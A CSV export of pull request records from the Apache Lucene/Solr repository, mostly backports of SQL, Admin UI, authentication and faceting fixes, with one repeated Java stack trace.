"","2570","SOLR-15621: index.html for Admin UI should send Solr version in the request for JavaScript files","backport of https://github.com/apache/solr/pull/292","closed","","thelabdude","2021-09-09T21:53:28Z","2021-09-10T14:05:24Z"
"","2568","SOLR-15620: Download Config button in Schema Designer screen should not require user to re-login when already authenticated","backport of https://github.com/apache/solr/pull/291  Testing is manual on FF, Chrome & Safari ... w/ and w/o security enabled.","closed","","thelabdude","2021-09-09T20:20:05Z","2021-09-09T20:42:33Z"
"","2552","SOLR-9853: Ability to project multi-valued fields in SQL query results","Backport of https://github.com/apache/solr/pull/252","closed","","thelabdude","2021-08-11T14:40:03Z","2021-08-11T15:11:28Z"
"","2553","SOLR-15579: Re-configure calcite to allow more values in an IN clause","backport of https://github.com/apache/solr/pull/249","closed","","thelabdude","2021-08-12T16:49:57Z","2021-08-12T17:52:01Z"
"","2548","SOLR-15576: Allow filtering on ISO-8601 formatted timestamp literals in SQL WHERE clause","backport of https://github.com/apache/solr/pull/247","closed","","thelabdude","2021-08-06T16:53:22Z","2021-08-06T16:53:32Z"
"","2547","SOLR-15575: Propagate request level basic auth creds from the top-level async CollectionAdminRequest to internally used async requests, such as async status checking","backport of https://github.com/apache/solr/pull/246","closed","","thelabdude","2021-08-04T22:26:34Z","2021-08-04T22:52:20Z"
"","2546","SOLR-15573: bin/solr auth tool should provide role bindings for security-read and config-edit by default","backport of https://github.com/apache/solr/pull/245","closed","","thelabdude","2021-08-03T17:02:42Z","2021-08-03T17:15:57Z"
"","2539","SOLR-15570: Include fields declared in the schema in table metadata (SQL) even if they are empty","backport of https://github.com/apache/solr/pull/241","closed","","thelabdude","2021-07-30T16:26:11Z","2021-07-30T16:27:54Z"
"","2537","SOLR-15566: Clarify ref guide documentation about SQL queries with SELECT * requiring a LIMIT clause","backport of https://github.com/apache/solr/pull/237","closed","","thelabdude","2021-07-29T16:36:24Z","2021-07-29T16:55:45Z"
"","2541","SOLR-15527: Security admin screen for managing users, roles, and permissions","backport of https://github.com/apache/solr/pull/209","closed","","thelabdude","2021-07-30T17:55:44Z","2021-07-30T18:32:09Z"
"","2524","SOLR-15456: Get field type info from luke for custom fields instead of defaulting to String in Parallel SQL","Backport of https://github.com/apache/solr/pull/181","closed","","thelabdude","2021-07-06T17:01:53Z","2021-07-06T17:02:51Z"
"","2522","SOLR-15460: Implement LIKE, IS NOT NULL, IS NULL, and support wildcard * in equals string literal","Backport of https://github.com/apache/solr/pull/173 to branch_8x","closed","","thelabdude","2021-07-06T16:02:46Z","2021-07-06T16:16:45Z"
"","2523","SOLR-15451: SolrSchema (for Parallel SQL) should use PKI principal for internal request to /admin/luke to get table metadata","Backport of https://github.com/apache/solr/pull/168 to branch_8x","closed","","thelabdude","2021-07-06T16:37:08Z","2021-07-06T16:37:37Z"
"","2486","SOLR-15384 Zookeeper Status handler /admin/zookeeper/status not queryable from SolrJ","Backport of https://github.com/apache/solr/pull/105 targeting 8x (8.9)","closed","","janhoy","2021-04-29T15:48:56Z","2021-05-06T08:36:52Z"
"","2666","LUCENE-10563: Fix failure to tessellate complex polygon (#933)","backport of https://github.com/apache/lucene/pull/933","closed","","iverase","2022-07-01T09:04:42Z","2022-07-01T09:19:19Z"
"","2656","LUCENE-10464, LUCENE-10477: WeightedSpanTermExtractor.extractWeightedSpanTerms to rewrite sufficiently","backport of https://github.com/apache/lucene/pull/737 and https://github.com/apache/lucene/pull/758  for https://issues.apache.org/jira/browse/LUCENE-10477 and https://issues.apache.org/jira/browse/LUCENE-10464","closed","","cpoerschke","2022-05-17T18:05:17Z","2022-05-18T10:55:50Z"
"","2474","LUCENE-9877: Allow up to 7 exceptions in PForUtil (instead of 3).","Backport of https://github.com/apache/lucene/pull/48","closed","","gsmiller","2021-03-29T23:22:05Z","2021-03-30T13:11:53Z"
"","2614","SOLR-15774: Avoid weird off-by-one errors with Angular's 'chosen' select box directive for the security and schema-designer screens in Admin UI","backport of https://github.com/apache/lucene-solr/pull/2613","closed","","thelabdude","2021-11-18T22:27:23Z","2021-11-18T22:27:39Z"
"","2586","SOLR-15665: Move polling logic under main","Backport of https://github.com/apache/lucene-solr/pull/2585","closed","","thelabdude","2021-09-29T16:33:02Z","2021-09-29T16:33:23Z"
"","2233","SOLR-15097: Supply base_url in replica data returned to Admin UI","Backport of https://github.com/apache/lucene-solr/pull/2232 to branch for 8.8","closed","","thelabdude","2021-01-21T23:19:25Z","2021-01-21T23:32:57Z"
"","2184","SOLR-15059: Improve query performance monitoring","Backport of https://github.com/apache/lucene-solr/pull/2165 to 8x","closed","","thelabdude","2021-01-07T16:52:04Z","2021-01-07T17:08:16Z"
"","2561","LUCENE-10060: Ensure DrillSidewaysQuery instances never get cached","Backport of a bug fix from `main`","closed","","gsmiller","2021-08-26T13:40:23Z","2021-08-26T14:01:20Z"
"","2602","SOLR-15766: MultiAuthPlugin should send non-AJAX anonymous requests to the plugin that allows anonymous requests","backport of #2601","closed","","thelabdude","2021-11-03T19:26:13Z","2021-11-03T19:36:36Z"
"","2600","SOLR-15721: Support editing Basic auth config when using the MultiAuthPlugin","backport of #2599","closed","","thelabdude","2021-11-03T16:36:06Z","2021-11-03T16:36:25Z"
"","2581","SOLR-15637: Set .tls for security UI based on data.security.tls in response from server","backport of #2580","closed","","thelabdude","2021-09-21T20:21:51Z","2021-09-21T20:21:58Z"
"","2571","SOLR-15621: index.html for Admin UI should send Solr version in the request for JavaScript files","backport of #2570","closed","","thelabdude","2021-09-10T14:34:02Z","2021-09-10T14:34:51Z"
"","2569","SOLR-15620: Download Config button in Schema Designer screen should not require user to re-login when already authenticated","backport of #2568","closed","","thelabdude","2021-09-09T21:09:01Z","2021-09-09T21:10:22Z"
"","1840","[Backport] LUCENE-9292: Refactor BKD point configuration into its own class (#1697)","backport of #1697","closed","","iverase","2020-09-08T08:07:32Z","2020-09-08T08:24:35Z"
"","2529","SOLR-15499: StatsStream implement ParallelMetricsRollup to allow for tiered computation of SQL metrics over collection aliases","Backport https://github.com/apache/solr/pull/197 to branch_8x","closed","","thelabdude","2021-07-06T21:02:43Z","2021-07-06T21:10:02Z"
"","2528","SOLR-15475: Implement COUNT and APPROX_COUNT_DISTINCT aggregation functions for Parallel SQL","Backport https://github.com/apache/solr/pull/194 to branch_8x","closed","","thelabdude","2021-07-06T20:23:38Z","2021-07-06T20:24:26Z"
"","2526","SOLR-15489: Implement OFFSET & FETCH for LIMIT SQL queries","Backport https://github.com/apache/solr/pull/191 to branch_8x","closed","","thelabdude","2021-07-06T19:25:59Z","2021-07-06T19:26:35Z"
"","2525","SOLR-15461: Upgrade Apache Calcite to latest release","Backport https://github.com/apache/solr/pull/177 to branch_8x","closed","","thelabdude","2021-07-06T18:49:37Z","2021-07-06T19:08:27Z"
"","2498","SOLR-15399: IndexFetcher should not issue a local commit for PULL replicas when leader's version is zero","Backport from main, see: https://github.com/apache/solr/commit/c731873aef43e81224caafdf02a1ba2f3b3a99e7","closed","","thelabdude","2021-05-20T19:19:41Z","2021-05-20T19:54:50Z"
"","2589","SOLR-15678 Allow only known content types in ShowFileRequestHandler","Backport from main repo","closed","","janhoy","2021-10-11T08:33:12Z","2021-10-11T08:51:33Z"
"","2558","LUCENE-5309: Optimize facet counting for single-valued SSDV / StringValueFacetCounts","Backport from main","closed","","gsmiller","2021-08-23T18:01:53Z","2021-08-23T21:54:16Z"
"","2646","SOLR-16022: Enforce special character requirements on passwords with length less than 15","backport from https://github.com/apache/solr/pull/741","closed","","thelabdude","2022-03-11T17:11:47Z","2022-03-11T17:23:18Z"
"","2587","LUCENE-10134: ConcurrentSortedSetDocValuesFacetCounts shouldn't share liveDocs Bits across threads","Backport from `main`","closed","","gsmiller","2021-10-01T23:45:49Z","2021-10-04T22:35:56Z"
"","2577","LUCENE-10070: Skip deleted documents during facet counting for all documents","Backport from `main`","closed","","gsmiller","2021-09-17T21:12:07Z","2021-10-05T12:51:50Z"
"","2534","LUCENE-10036: Add factory method to ScoreCachingWrappingScorer that ensures unnecessary wrapping doesn't occur","Backport from `lucene/main`.","closed","","gsmiller","2021-07-26T21:35:02Z","2021-07-27T14:54:16Z"
"","2545","LUCENE-9945: Extend DrillSidewaysResult to expose drillDowns and drillSideways","Backport from 9.0. Added `@deprecated` ctors to adhere to backwards compatibility [policy](https://cwiki.apache.org/confluence/display/LUCENE/BackwardsCompatibility)","closed","","gsmiller","2021-08-02T23:41:19Z","2021-08-02T23:44:33Z"
"","2496","SOLR-11904: Mark ReplicationHandler's polling thread as a Solr server thread so the PKI Interceptor is activated","backport fixes from main to branch_8x, see: https://github.com/apache/solr/commit/ae1ac22eb70d44f80e5c89241bdd0d3e4144e62a","closed","","thelabdude","2021-05-17T17:17:59Z","2021-05-17T17:29:38Z"
"","2151","SOLR-15054: Test should not require private methods to be final","Backport fix to 8x ... See parent PR -> https://github.com/apache/lucene-solr/pull/2150","closed","","thelabdude","2020-12-16T22:29:36Z","2020-12-16T22:35:45Z"
"","2504","LUCENE-9991: Address bug in TestStringValueFacetCounts","Backport a test case bug fix into branch_8x","closed","","gsmiller","2021-06-05T14:35:48Z","2021-06-06T14:48:59Z"
"","2505","LUCENE-9991: Address bug in TestStringValueFacetCounts","Backport a test case bug fix into branch_8_9","closed","","gsmiller","2021-06-05T14:36:30Z","2021-06-06T14:48:57Z"
"","2549","LUCENE-10046: Fix counting bug in StringValueFacetCounts","Backport a bug fix from 9.0","closed","","gsmiller","2021-08-07T01:00:01Z","2021-08-07T14:33:55Z"
"","2543","LUCENE-9964: Duplicate long values in a field should only be counted once when using SortedNumericDocValuesFields","Backport","closed","","gsmiller","2021-08-01T19:34:59Z","2021-08-01T20:58:29Z"
"","2483","LUCENE-9574 - Add a token filter to drop tokens based on flags.","Backport","closed","","gus-asf","2021-04-28T02:12:22Z","2021-04-28T02:14:29Z"
"","2195","SOLR-15036: Automatically wrap a facet expression with a select / rollup / sort / plist when using a collection alias with multiple collections and count|sum|min|max|avg metrics. (backport)","Back-port to 8x, see original PR: https://github.com/apache/lucene-solr/pull/2132","closed","","thelabdude","2021-01-11T18:21:12Z","2021-01-11T18:28:04Z"
"","2592","LUCENE-10179 No longer check for release status on mirrors (8x)","Back-port from lucene/main, for 8.11  https://issues.apache.org/jira/browse/LUCENE-10179","closed","","janhoy","2021-10-15T20:05:20Z","2021-10-16T12:59:58Z"
"","2551","Backport Flatten GraphFilter changes from lucene to lucene-solr","back porting the commits that resolve https://issues.apache.org/jira/browse/LUCENE-9963 to lucene-solr. These changes make no API changes and fix bugs present.  I'm concerned about the formatting as it appears to be different from this branch. The `ant precommit` command from https://cwiki.apache.org/confluence/display/LUCENE/Old+How+to+contribute doesn't appear to exist anymore. I couldn't pick out a build directive that checked for style.","closed","","glawson0","2021-08-10T10:20:30Z","2021-08-16T14:02:35Z"
"","1790","Rename TestDirectoryFactory to DirectoryFactoriesTest","As part of https://issues.apache.org/jira/browse/LUCENE-8626 I noticed that we have both * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.1/solr/core/src/test/org/apache/solr/core/DirectoryFactoryTest.java and * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.1/solr/core/src/test/org/apache/solr/core/TestDirectoryFactory.java which is mildly confusing.  Something like ""DirectoryFactoriesTest"" more accurately describes what the ""TestDirectoryFactory"" test does.","closed","","cpoerschke","2020-08-26T17:11:21Z","2020-09-09T12:08:25Z"
"","2032","Rename TestSolrTestCaseJ4 to SolrTestCaseJ4DeleteCoreTest.","As part of https://issues.apache.org/jira/browse/LUCENE-8626 I noticed that we have both  * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/SolrTestCaseJ4Test.java and * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/TestSolrTestCaseJ4.java which is mildly confusing.  Something like ""SolrTestCaseJ4DeleteCoreTest"" more accurately describes what the ""TestSolrTestCaseJ4"" test does.","closed","","cpoerschke","2020-10-26T12:14:34Z","2020-11-02T16:13:06Z"
"","1890","Rename ConfigSetsAPITest to TestConfigSetsAPIShareSchema","As part of https://issues.apache.org/jira/browse/LUCENE-8626 I noticed that we have both  * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/cloud/ConfigSetsAPITest.java and * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/cloud/TestConfigSetsAPI.java which is mildly confusing.  I also note that * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/cloud/TestConfigSetsAPIExclusivity.java and * https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.6.2/solr/core/src/test/org/apache/solr/cloud/TestConfigSetsAPIZkFailure.java exist in the same package i.e. this part of the code base favours `Test*.java` naming.  Something like ""TestConfigSetsAPIShareSchema"" more accurately describes what the ""ConfigSetsAPITest"" test does.","closed","","cpoerschke","2020-09-18T16:19:54Z","2020-10-26T09:45:19Z"
"","1745","Append MultiCollectorTest to TestMultiCollector.","As part of https://issues.apache.org/jira/browse/LUCENE-8626 I noticed that `MultiCollector` has two tests. This pull request proposes to unify them into one test.","closed","","cpoerschke","2020-08-12T14:32:38Z","2020-08-24T11:28:05Z"
"","2267","LUCENE-9707: Hunspell: check Lucene's implementation against Hunspel's test data","and unify test naming in SpellCheckerTest   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We want to have more or less parity in Java and C++ Hunspell implementations  # Solution  See below  # Tests  Added `TestsFromOriginalHunspellRepository` that runs spell checker on all flies from Hunspell repository which should be checked out somewhere. Some tests still fail there, but it won't fail on the CI now because it only runs when there's a special system property defined.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-29T09:32:50Z","2021-02-02T10:05:56Z"
"","1972","SOLR-14915: Prometheus-exporter does not depend on Solr-core any longer","And enhanced gradle config to operate as an application https://issues.apache.org/jira/browse/SOLR-14915  It's cool that I can now run this thing via `gw run` :-) The Java-Application plugin for Gradle has other nice distribution facilities that render our attempts to hand-edit startup scripts obsolete.  However, using it would mean a much larger Solr distribution as it'd have duplicated libs that Solr has.  Any way, it's nice to leave here for people who might want to activate it manually.  As-is there is something not quite right.  I modified the solr-exporter bash script to not add all of the Solr server libs to the classpath.  However, the assembly task only populates a small number of dependencies into the ""lib"" here.  In particular I don't see transitive dependencies such as Jackson (used by jackson-jq).    @dweiss do you have suggestions here?  Alternatively, I could remove my changes to solr-exporter scripts and accept that they are going to add a ton more dependencies than actually needed.  That's okay.  `lucene-solr/solr/packaging/build/solr-9.0.0-SNAPSHOT/contrib/prometheus-exporter` ``` ├── bin │   ├── main │   ├── solr-exporter │   ├── solr-exporter.cmd │   └── test ├── conf │   ├── grafana-solr-dashboard.json │   └── solr-exporter-config.xml └── lib     ├── argparse4j-0.8.1.jar     ├── disruptor-3.4.2.jar     ├── jackson-jq-0.0.8.jar     ├── simpleclient-0.2.0.jar     ├── simpleclient_common-0.2.0.jar     └── simpleclient_httpserver-0.2.0.jar ```","closed","","dsmiley","2020-10-11T05:09:42Z","2020-11-27T20:08:54Z"
"","1797","LUCENE ExitableReaderException public constructor","And cross-link javadocs with TimeLimitingCollector","closed","","dsmiley","2020-08-28T18:28:12Z","2020-09-02T15:30:35Z"
"","2460","SOLR-15219: Fix TestPointFields integer overflow","And also restore it's getRandomInts(..,..,bound) semantics to what it was -- positive or negative random values.  https://issues.apache.org/jira/browse/SOLR-15219  @madrob about a year ago you added a static analysis checker and made various changes to comply with its recommendations.  That did not introduce the bug I'm fixing here but nonetheless I can tell that the change recommended by ""errorprone"" (that you performed) was not the intention of the original code.  The original code wanted random integers within a ""bound"" that is positive *or negative*.  To make this clearer, I changed the parameter name to `boundPosNeg` and I changed the code to reflect ""errorprone"" recommendation if you intended the original semantics.","closed","","dsmiley","2021-03-05T15:20:18Z","2021-03-05T18:42:14Z"
"","2563","SOLR-15599: Upgrade AWS SDK from v1 to v2","Also removed woodstox-core-asl dependency, and replaced with com.fasterxml.woodstox:woodstox-core:6.2.4, the newer version of the dependency.  https://issues.apache.org/jira/browse/SOLR-15599  (Backport from main)","closed","","HoustonPutman","2021-08-30T18:45:00Z","2021-08-31T17:45:15Z"
"","2394","SOLR-14704 add download option to cloud.sh (#1715),","also ensure lucene libs exist  (cherry picked from commit 65da5ed32c940529b27a518deb8ffd1e61aa2e96) (backport)","closed","","gus-asf","2021-02-18T00:12:51Z","2021-02-18T00:54:47Z"
"","1864","SOLR-14850 ExactStatsCache NullPointerException when shards.tolerant=true","All derived classes from `ExactStatsCache` fails if `shards.tolerant=true` and some shard is down.  ``` java.lang.NullPointerException 	at org.apache.solr.client.solrj.SolrResponse.getException(SolrResponse.java:59) 	at org.apache.solr.search.stats.ExactStatsCache.doMergeToGlobalStats(ExactStatsCache.java:104) 	at org.apache.solr.search.stats.StatsCache.mergeToGlobalStats(StatsCache.java:173) 	at org.apache.solr.handler.component.QueryComponent.updateStats(QueryComponent.java:713) 	at org.apache.solr.handler.component.QueryComponent.handleRegularResponses(QueryComponent.java:630) 	at org.apache.solr.handler.component.QueryComponent.handleResponses(QueryComponent.java:605) 	at org.apache.solr.handler.component.SearchHandler.handleRequestBody(SearchHandler.java:457) 	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:214) 	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2606) 	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:812) 	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:588) 	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:415) 	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:345) 	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1596) 	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:545) 	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143) 	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:590) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:235) 	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1610) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233) 	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1300) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188) 	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:485) 	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1580) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186) 	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1215) 	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141) 	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:221) 	at org.eclipse.jetty.server.handler.InetAccessHandler.handle(InetAccessHandler.java:177) 	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:146) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:322) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.server.Server.handle(Server.java:500) 	at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:383) 	at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:547) 	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:375) 	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:273) 	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311) 	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103) 	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:336) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:313) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:171) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129) 	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:375) 	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:806) 	at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:938) 	at java.base/java.lang.Thread.run(Unknown Source) ```","closed","","Hronom","2020-09-13T15:25:17Z","2020-10-21T11:52:38Z"
"","1862","SOLR-14850 ExactStatsCache NullPointerException when shards.tolerant=…","All derived classes from `ExactStatsCache` fails if `shards.tolerant=true` and some shard is down.  ``` java.lang.NullPointerException 	at org.apache.solr.client.solrj.SolrResponse.getException(SolrResponse.java:59) 	at org.apache.solr.search.stats.ExactStatsCache.doMergeToGlobalStats(ExactStatsCache.java:104) 	at org.apache.solr.search.stats.StatsCache.mergeToGlobalStats(StatsCache.java:173) 	at org.apache.solr.handler.component.QueryComponent.updateStats(QueryComponent.java:713) 	at org.apache.solr.handler.component.QueryComponent.handleRegularResponses(QueryComponent.java:630) 	at org.apache.solr.handler.component.QueryComponent.handleResponses(QueryComponent.java:605) 	at org.apache.solr.handler.component.SearchHandler.handleRequestBody(SearchHandler.java:457) 	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:214) 	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2606) 	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:812) 	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:588) 	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:415) 	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:345) 	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1596) 	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:545) 	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143) 	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:590) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:235) 	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1610) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233) 	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1300) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188) 	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:485) 	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1580) 	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186) 	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1215) 	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141) 	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:221) 	at org.eclipse.jetty.server.handler.InetAccessHandler.handle(InetAccessHandler.java:177) 	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:146) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:322) 	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) 	at org.eclipse.jetty.server.Server.handle(Server.java:500) 	at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:383) 	at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:547) 	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:375) 	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:273) 	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311) 	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103) 	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:336) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:313) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:171) 	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129) 	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:375) 	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:806) 	at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:938) 	at java.base/java.lang.Thread.run(Unknown Source) ```","closed","","Hronom","2020-09-12T15:03:04Z","2020-09-13T15:27:02Z"
"","2355","SOLR-15145: solr.storeBaseUrl feature flag introduced in 8.8.1 should default to false for 9.x","Align solr's changes.txt with fixes going into 8x / 8.8 and change the default value of the `solr.storeBaseUrl` sys prop for master.","closed","","thelabdude","2021-02-11T18:04:51Z","2021-02-11T19:50:30Z"
"","2273","SOLR-8319: Add method for term field search in FieldType","Addresses NPE found in https://issues.apache.org/jira/browse/SOLR-8319  Will do some performance comparisons before merging as well.","closed","","HoustonPutman","2021-01-29T18:45:53Z","2021-12-10T18:20:33Z"
"","2121","SOLR-10860: Return proper error code for bad input incase of inplace updates","Additionally, * Return proper error when inc operation is specified for non-numeric fields","closed","","munendrasn","2020-12-05T06:27:11Z","2021-01-07T15:15:47Z"
"","2119","Added support to download index folders from gcs url","Added support in luke to read from GCS URI. Downloads the file/folder locally and points the resulting browse path that location.   To use: verify that BUCKET_NAME and project_id are properly set.  Run `./gradlew lucene:luke:assemble` Run the last `java -jar [..]` command that was written to console","closed","","heqianw","2020-12-04T16:57:20Z","2020-12-04T16:57:35Z"
"","2663","SOLR-16218: Fix bug in in-place update when failOnVersionConflicts=false","Added more people to CHANGES to include folks who contributed to reviewing this fix. Will updated the CHANGES in main and 9x too.","closed","","anshumg","2022-06-13T15:06:33Z","2022-06-13T15:34:34Z"
"","1857","Update json-faceting-domain-changes.adoc","Added missing word   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Added a missing word.  # Solution  Added the word.  # Tests   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","moisheschwartz","2020-09-10T20:41:36Z","2020-09-13T08:05:38Z"
"","2438","SOLR-14928: add exponential backoff for distributed cluster state updates","add exponential backoff wait time when Compare And Swap fails in distributed cluster state update due to concurrent update","closed","","murblanc","2021-02-27T17:17:18Z","2021-03-04T18:12:35Z"
"","2499","LUCENE-9687: Hunspell support improvements","add API for spell-checking and suggestions, support compound words,   fix various behavior differences between Java and C++ implementations, improve performance  backported from ""main"" branch: mostly it's copy-paste, plus replacing JDK 11 usages with 8-compatible equivalents","closed","","donnerpeter","2021-05-21T13:34:14Z","2021-05-28T22:11:13Z"
"","2126","LUCENE-9628 ScoreMode.TOP_DOCS in bool queries","Account for ScoreMode.TOP_DOCS and TOP_DOCS_WITH_SCORES in boolean queries  LUCENE-9280 introduced new ScoreModes of TOP_DOCS and TOP_DOCS_WITH_SCORES, but some boolean queries were not considering these score modes. This patch fixes some of these cases and also enhances definition for these score modes.","open","","mayya-sharipova","2020-12-07T16:52:06Z","2020-12-15T15:39:13Z"
